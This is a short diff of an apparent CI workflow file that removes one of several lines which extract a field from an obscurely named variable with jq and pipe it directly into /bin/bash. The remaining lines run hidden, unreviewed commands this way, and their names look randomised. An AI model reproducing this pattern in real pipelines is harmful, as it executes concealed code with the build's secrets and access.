@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$ev1" | jq -r .r903 | /bin/bash
           echo $kom62529 | jq -r .kp4 | /bin/bash
           printf '%s' "$m0" | jq -r .o074 | /bin/bash
-          echo $pricq20925 | jq -r .hkau249 | /bin/bash
           printf '%s' "$oqkv3" | jq -r .ur1 | /bin/bash
 
       - name: Archive results
